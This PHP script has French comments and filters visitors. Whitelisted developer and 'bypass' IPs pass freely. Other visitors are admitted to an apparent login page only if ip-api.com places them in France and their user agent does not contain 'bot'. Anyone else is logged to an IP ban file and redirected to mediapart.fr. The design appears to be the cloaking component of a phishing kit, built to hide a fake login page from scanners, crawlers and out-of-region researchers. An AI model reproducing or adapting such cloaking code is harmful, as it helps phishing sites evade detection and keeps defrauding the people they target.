<?php
include("../settings.php");

$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];

// Tableau des adresses IP autorisées
$adresses_ip_autorisees = array(
    $ip_dev, 
    $ip_bypass,   // Ajoutez d'autres adresses IP autorisées ici
    '127.0.0.1'
);

if (in_array($ip, $adresses_ip_autorisees)) {    
    // Access allowed for specified IPs
} else {
    // Utilisez cURL pour interroger l'API
    $api_url = "http://ip-api.com/json/$ip";
    $ch = curl_init($api_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    if ($response) {
        // Analysez la réponse JSON
        $data = json_decode($response, true);

        // Vérifiez si l'IP est de France
        $country = $data['country'] ?? '';
        
        // Check if the user agent contains "bot"
        $is_bot = stripos($user_agent, 'bot') !== false;

        if (strtolower($country) === 'france' && !$is_bot) {
            // Continue with the rest of your code or redirect to the login page
        } else {
            $banned_ip_file = '../ip_ban.txt';
            $banned_ip_list = file_get_contents($banned_ip_file);        
            if (strpos($banned_ip_list, $ip) === false) {
                $banned_ip_list .= $ip . "\n";
                file_put_contents($banned_ip_file, $banned_ip_list);
            }
            
            header("Location: https://www.mediapart.fr/");
            exit; 
        }
    } else {
        echo "Erreur lors de la récupération des informations de l'API.";
    }
}
?>
